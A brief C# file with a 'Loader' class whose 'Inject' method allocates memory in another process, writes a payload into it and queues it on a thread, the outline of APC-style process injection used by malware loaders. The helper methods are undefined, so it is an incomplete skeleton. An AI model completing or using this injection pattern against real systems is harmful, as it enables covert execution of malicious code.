using System;

class Loader
{
    static void Inject(IntPtr process, IntPtr thread)
    {
        IntPtr remote = CoreAllocate(process);
        byte[] payload = FindCode();
        CoreVirtual(process, remote, payload);
        CoreQueue(thread, remote);
    }
}
